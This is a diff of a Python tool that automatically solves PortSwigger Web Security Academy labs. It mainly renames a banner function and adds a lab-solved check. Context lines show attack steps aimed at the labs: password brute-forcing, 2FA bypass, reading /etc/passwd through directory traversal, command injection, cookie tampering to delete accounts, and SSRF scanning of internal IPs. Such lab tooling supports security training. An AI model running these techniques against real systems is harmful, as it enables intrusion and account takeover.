@@ -54,13 +54,20 @@ def signal_handler(signal, frame):
 signal.signal(signal.SIGINT, signal_handler)
 
 
-def paas():
+def clear_screen_and_print_paas_ascii_art():
     os.system("clear")
     art = text2art("PAAS")
     print(art)
     print("[P]ortSwigger [A]cademy [A]utomatic [S]olver")
     print("by mr246\n")
     loading_effect("", 0.4)
+
+
+def check_if_the_lab_is_solved():
+    time.sleep(1)
+    r = s.get(url, verify=False, proxies=proxies)
+    if "Congratulations, you solved the lab!" in r.text:
+        exit_program(1)
 
 
 async def async_get_csrf_token(path, url, session):
@@ -97,7 +104,7 @@ def encode_all(input_to_encode):
 def press_any_key():
     loading_effect("...", 1)
     check_user_input("\npress enter to continue...", 0)
-    paas()
+    clear_screen_and_print_paas_ascii_art()
 
 
 def check_user_input(text, is_url, number_of_options=0):
@@ -140,7 +147,7 @@ def check_user_input(text, is_url, number_of_options=0):
     if str(user_input).isnumeric():
         user_input = int(user_input)
 
-    paas()
+    clear_screen_and_print_paas_ascii_art()
     user_input_repeat_count = 0
     return user_input
 
@@ -150,7 +157,7 @@ def create_user_list(lab_name):
 
     loading_effect("creating user list...", 2)
 
-    paas()
+    clear_screen_and_print_paas_ascii_art()
     print("userlist successfully created!\n")
 
     print("==== USER LIST ====")
@@ -163,7 +170,7 @@ def create_user_list(lab_name):
     print("==== THE END OF THE USER LIST ====")
 
     check_user_input("\npress any key to continue", 0)
-    paas()
+    clear_screen_and_print_paas_ascii_art()
 
 
 def create_password_list(lab_name):
@@ -171,7 +178,7 @@ def create_password_list(lab_name):
 
     loading_effect("creating password list...", 2)
 
-    paas()
+    clear_screen_and_print_paas_ascii_art()
     print("password list successfully created!\n")
 
     print("==== PASSWORD LIST ====")
@@ -207,7 +214,7 @@ def set_default_url_variables():
 
 
 def print_menu_from_dictionary(menu_name, menu_options):
-    paas()
+    clear_screen_and_print_paas_ascii_art()
     print(f"== {menu_name} Menu ".ljust(77, "="))
     for key, value in menu_options.items():
         print(f"[{key}] {value}")
@@ -224,7 +231,7 @@ def print_menu_from_dictionary(menu_name, menu_options):
     global selected_lab
     selected_lab = int(user_input)
 
-    paas()
+    clear_screen_and_print_paas_ascii_art()
     print(f"== {menu_header} ".ljust(77, "="))
 
     set_default_url_variables()
@@ -269,11 +276,8 @@ async def authentication_labs():
         # Confirm bypass
         r = s.get(myaccount_url, verify=False, proxies=proxies)
         if log_out_text in r.text:
-            paas()
+            clear_screen_and_print_paas_ascii_art()
             print("[+] Successfully bypassed 2FA verification.")
-            exit_program(1)
-        else:
-            exit_program(0)
 
     if selected_lab == 2:
         loading_effect("changing carlos's password...", 1)
@@ -287,11 +291,8 @@ async def authentication_labs():
 
         # Confirm exploit worked
         if log_out_text in r.text:
-            paas()
+            clear_screen_and_print_paas_ascii_art()
             print("[+] Successfully logged into carlos's account.")
-            exit_program(1)
-        else:
-            exit_program(0)
 
     if selected_lab == 3:
         print("This lab is not have fully automated solve in PAAS.")
@@ -337,8 +338,6 @@ async def authentication_labs():
                 r = s.get(myaccount_url, cookies=cookies, verify=False, proxies=proxies)
                 if log_out_text in r.text:
                     print(f"\n[+] Valid credentials found! Credentials: carlos:{pwd}")
-                    exit_program(1)
-            exit_program(0)
 
     if selected_lab == 5:
         loading_effect("logging into wiener's account...", 1)
@@ -366,8 +365,6 @@ async def authentication_labs():
                 login_url = url + "/login"
                 login_data = {"username": "carlos", "password": pwd}
                 s.post(login_url, data=login_data, verify=False, proxies=proxies)
-                exit_program(1)
-        exit_program(0)
 
     if selected_lab == 6:
         loading_effect(attacking_text, 1)
@@ -381,12 +378,7 @@ async def authentication_labs():
 
         headers = {"Content-Type": "application/json"}
         data = {"username": "carlos", "password": password_list}
-        r = s.post(login_url, json=data, headers=headers, verify=False, proxies=proxies)
-
-        if log_out_text in r.text:
-            exit_program(1)
-        else:
-            exit_program(0)
+        s.post(login_url, json=data, headers=headers, verify=False, proxies=proxies)
 
     if selected_lab == 7:
         step_two_url = url + "/login2"
@@ -429,8 +421,7 @@ async def authentication_labs():
 
         await find_valid_mfa_code()
 
-    else:
-        exit_program(0)
+    check_if_the_lab_is_solved()
 
 
 def directory_traversal_labs():
@@ -466,9 +457,8 @@ def directory_traversal_labs():
         print("\n==== CONTENT OF THE /etc/passwd FILE ====\n")
         print(r.text)
         print("==== END OF THE /etc/passwd FILE ====")
-        exit_program(1)
-    else:
-        exit_program(0)
+        
+    check_if_the_lab_is_solved()
 
 
 def os_command_injection_labs():
@@ -490,9 +480,6 @@ def os_command_injection_labs():
 
         if len(r.text) > 3:
             print("\n[+] Return from the target: " + r.text)
-            exit_program(1)
-        else:
-            exit_program(0)
 
     elif selected_lab == 2:
         loading_effect(getting_csrf_token_text, 1)
@@ -508,9 +495,6 @@ def os_command_injection_labs():
         # Verify exploit
         if res.elapsed.total_seconds() >= 10:
             print("[+] \"email\" field vulnerable to time-based command injection!")
-            exit_program(1)
-        else:
-            exit_program(0)
 
     elif selected_lab == 3:
         # Getting CSRF Token
@@ -529,12 +513,8 @@ def os_command_injection_labs():
         r = s.get(url + file_path, verify=False, proxies=proxies)
         if r.status_code == 200:
             print("[+] \"email\" field vulnerable to time-based command injection!")
-            exit_program(1)
-        else:
-            exit_program(0)
 
-    else:
-        exit_program(0)
+    check_if_the_lab_is_solved()
 
 
 def access_control_vulnerabilities_labs():
@@ -562,10 +542,8 @@ def access_control_vulnerabilities_labs():
         req = s.post(admin_panel_delete_carlos_url, verify=False, proxies=proxies)
         if req.status_code == 200:
             print("\n[+] Successfully deleted carlos's account.")
-            exit_program(1)
         else:
             print("\n[-] carlos's account is not found!")
-            exit_program(0)
 
     if selected_lab == 2:
         loading_effect("searching for admin panel...", 1)
@@ -578,11 +556,9 @@ def access_control_vulnerabilities_labs():
         loading_effect(deleting_carlos_s_account_text, 1)
         delete_carlos_url = url + admin_path + "/delete?username=carlos"
         r = s.get(delete_carlos_url, verify=False, proxies=proxies)
+
         if r.status_code == 200:
             print("[+] Successfully deleted carlos's account!")
-            exit_program(1)
-        else:
-            exit_program(0)
 
     if selected_lab == 3:
         loading_effect(getting_csrf_token_text, 1)
@@ -597,13 +573,7 @@ def access_control_vulnerabilities_labs():
             loading_effect("changing cookies...", 1)
             cookies = {"session": "kebap", "Admin": "true"}
             loading_effect(deleting_carlos_s_account_text, 1)
-            r = s.get(delete_carlos_url, cookies=cookies, verify=False, proxies=proxies)
-            if r.status_code == 200:
-                exit_program(1)
-            else:
-                exit_program(0)
-        else:
-            exit_program(0)
+            s.get(delete_carlos_url, cookies=cookies, verify=False, proxies=proxies)
 
     if selected_lab == 4:
         data = {"username": "wiener", "password": "peter"}
@@ -624,11 +594,6 @@ def access_control_vulnerabilities_labs():
 
                 if r.status_code == 200:
                     print("[+] Successfully deleted carlos's account.")
-                    exit_program(1)
-                else:
-                    exit_program(0)
-        else:
-            exit_program(0)
 
     if selected_lab == 5:
         loading_effect("changing header for be able to access admin panel...", 1)
@@ -641,9 +606,6 @@ def access_control_vulnerabilities_labs():
         r = s.get(url, verify=False, proxies=proxies)
         if lab_solved_text in r.text:
             print(successfully_deleted_carlos_text)
-            exit_program(1)
-        else:
-            exit_program(0)
 
     if selected_lab == 6:
         loading_effect(logging_in_as_wiener_user_text, 1)
@@ -654,11 +616,6 @@ def access_control_vulnerabilities_labs():
             loading_effect("upgrading wiener's account...", 1)
             upgrade_wiener_url = url + "/admin-roles?username=wiener&action=upgrade"
             r = s.get(upgrade_wiener_url, verify=False, proxies=proxies)
-
-            if "Admin panel" in r.text:
-                exit_program(1)
-            else:
-                exit_program(0)
 
     if selected_lab == 7:
         loading_effect(getting_csrf_token_text, 1)
@@ -680,11 +637,6 @@ def access_control_vulnerabilities_labs():
                 loading_effect(submitting_solution_text, 1)
                 data = {"answer": f"{api_key}"}
                 s.post(submit_solution_url, data=data, verify=False, proxies=proxies)
-                exit_program(1)
-            else:
-                exit_program(0)
-        else:
-            exit_program(0)
 
     if selected_lab == 8:
         loading_effect("searching for carlos's blog posts...", 1)
@@ -718,11 +670,6 @@ def access_control_vulnerabilities_labs():
                 loading_effect(submitting_solution_text, 1)
                 data = {"answer": f"{api_key}"}
                 s.post(submit_solution_url, data=data, verify=False, proxies=proxies)
-                exit_program(1)
-            else:
-                exit_program(0)
-        else:
-            exit_program(0)
 
     if selected_lab == 9:
         loading_effect("logging into wiener user...", 1)
@@ -741,11 +688,6 @@ def access_control_vulnerabilities_labs():
 
                 loading_effect(submitting_solution_text, 1)
                 s.post(submit_solution_url, data=data, verify=False, proxies=proxies)
-                exit_program(1)
-            else:
-                exit_program(0)
-        else:
-            exit_program(0)
 
     if selected_lab == 10:
         loading_effect("logging into wiener account...", 1)
@@ -772,11 +714,6 @@ def access_control_vulnerabilities_labs():
                 delete_carlos_url = url + "/admin/delete?username=carlos"
                 r = s.get(delete_carlos_url, verify=False, proxies=proxies)
 
-                if r.status_code == 200:
-                    exit_program(1)
-                else:
-                    exit_program(0)
-
     if selected_lab == 11:
         loading_effect("getting other conversations...", 1)
         chat_url = url + "/download-transcript/1.txt"
@@ -793,11 +730,6 @@ def access_control_vulnerabilities_labs():
 
             if log_out_text in r.text:
                 print("[+] Successfully logged in as the carlos user.")
-                exit_program(1)
-            else:
-                exit_program(0)
-        else:
-            exit_program(0)
 
     if selected_lab == 12:
         loading_effect(logging_in_as_wiener_user_text, 1)
@@ -812,9 +744,6 @@ def access_control_vulnerabilities_labs():
 
             if r.status_code == 200:
                 print("[+] Successfully upgraded wiener to administrator.")
-                exit_program(1)
-            else:
-                exit_program(0)
 
     if selected_lab == 13:
         loading_effect(logging_in_as_wiener_user_text, 1)
@@ -829,12 +758,11 @@ def access_control_vulnerabilities_labs():
 
             if r.status_code == 200:
                 print("[+] Successfully upgraded wiener to administrator.")
-                exit_program(1)
-            else:
-                exit_program(0)
+
         else:
             print("(-) Could not login as the wiener user.")
-            sys.exit(-1)
+
+    check_if_the_lab_is_solved()
 
 
 def server_side_request_forgery_labs():
@@ -855,10 +783,7 @@ def server_side_request_forgery_labs():
         r = s.get(url, verify=False, proxies=proxies)
         if lab_solved_text in r.text:
             print(successfully_deleted_carlos_text)
-            exit_program(1)
-
-        else:
-            exit_program(0)
+            
 
     if selected_lab == 2:
         print("Searching for admin hostname...")
@@ -871,7 +796,7 @@ def server_side_request_forgery_labs():
             r = requests.post(url + check_stock_path, data=data, verify=False, proxies=proxies)
 
             if r.status_code == 200:
-                paas()
+                clear_screen_and_print_paas_ascii_art()
                 print("[+] hostname found!")
                 admin_ip_address = f"192.168.0.{i}"
 
@@ -884,19 +809,21 @@ def server_side_request_forgery_labs():
                 requests.post(url + check_stock_path, data=data, verify=False, proxies=proxies)
                 exit_program(1)
 
+    check_if_the_lab_is_solved()
+
 
 async def main():
     # disable warnings for asyncio
     asyncio.get_running_loop().set_exception_handler(lambda _, __: None)
 
     # paas ascii art
-    paas()
+    clear_screen_and_print_paas_ascii_art()
 
     # loading bar
     for i in tqdm(range(100), desc="Loading…", ascii=False):
         time.sleep(0.006)
 
-    paas()
+    clear_screen_and_print_paas_ascii_art()
     time.sleep(0.4)
     print("=============================================================================")
     menu_options = {
@@ -916,13 +843,13 @@ async def main():
         await eval('_'.join(menu_options[user_input].lower().split()) + "()")
 
     except Exception as e:
-        paas()
+        clear_screen_and_print_paas_ascii_art()
 
         # print error for development
         print(e)
 
         exit_program(0)
-
+        
 
 if __name__ == "__main__":
     loop = asyncio.get_event_loop()
